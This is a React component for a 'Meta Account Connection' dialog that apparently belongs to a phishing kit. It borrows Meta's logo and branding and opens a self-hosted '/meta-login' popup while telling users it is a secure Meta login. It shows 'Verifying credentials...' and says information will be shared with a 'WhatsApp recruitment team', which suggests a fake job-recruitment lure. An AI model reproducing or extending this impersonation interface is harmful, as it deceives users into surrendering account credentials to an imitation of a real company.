import React, { useState, useEffect, useRef } from "react";
import { ShieldCheck, Loader2 } from "lucide-react";
import { 
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogClose
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";

interface MetaLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
}

const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => {
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const popupRef = useRef<Window | null>(null);
  const popupCheckIntervalRef = useRef<NodeJS.Timeout | null>(null);
  
  // Open popup when dialog is shown
  useEffect(() => {
    if (isOpen && !isLoggingIn) {
      setIsLoggingIn(true);
      
      // Calculate center position for the popup
      const width = 500;
      const height = 700;
      const left = window.screen.width / 2 - width / 2;
      const top = window.screen.height / 2 - height / 2;
      
      // Open popup
      const popup = window.open(
        '/meta-login',
        'MetaLogin',
        `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes`
      );
      
      popupRef.current = popup;
      
      // Check if popup is closed
      popupCheckIntervalRef.current = setInterval(() => {
        if (popup && popup.closed) {
          clearInterval(popupCheckIntervalRef.current as NodeJS.Timeout);
          onSuccess();
          setIsLoggingIn(false);
        }
      }, 500);
      
      return () => {
        if (popupCheckIntervalRef.current) {
          clearInterval(popupCheckIntervalRef.current);
        }
        
        if (popupRef.current && !popupRef.current.closed) {
          popupRef.current.close();
        }
      };
    }
  }, [isOpen, onSuccess]);

  // Handle cancel
  const handleCancel = () => {
    if (popupRef.current && !popupRef.current.closed) {
      popupRef.current.close();
    }
    
    if (popupCheckIntervalRef.current) {
      clearInterval(popupCheckIntervalRef.current);
    }
    
    setIsLoggingIn(false);
    onClose();
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <DialogTitle className="text-2xl font-bold text-[#1877F2] text-center">
            Meta Account Connection
          </DialogTitle>
        </DialogHeader>
        
        <div className="space-y-6 mt-4 text-center">
          <div className="flex justify-center mb-2">
            <img 
              src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
              alt="Meta Logo" 
              className="h-16"
            />
          </div>
          
          <div className="flex items-center justify-center flex-col">
            <ShieldCheck className="h-10 w-10 text-[#1877F2] mb-4" />
            <p className="text-gray-700 mb-6">
              A secure Meta login window has opened in a new tab. 
              Please complete the authentication process to connect your account.
            </p>
            
            <div className="w-full mb-6">
              <div className="h-1 bg-[#e7f3ff] mb-2 overflow-hidden">
                <div className="bg-[#1877F2] h-full transition-all duration-300 ease-in-out animate-progress-indeterminate" />
              </div>
              <div className="flex items-center justify-center">
                <p className="text-sm text-gray-600">Verifying credentials...</p>
              </div>
            </div>
            
            <p className="text-sm text-gray-500 mb-4">
              If you don't see the Meta login window, please check if it was blocked by your browser.
            </p>
            
            <Button 
              variant="outline"
              onClick={handleCancel}
              className="w-full"
            >
              Cancel
            </Button>
          </div>
          
          <div className="border-t border-gray-300 pt-4">
            <p className="text-center text-xs text-gray-500">
              By connecting your Meta account, you agree to our Terms of Service and Privacy Policy. 
              Your application information will be shared with the WhatsApp recruitment team.
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default MetaLoginModal;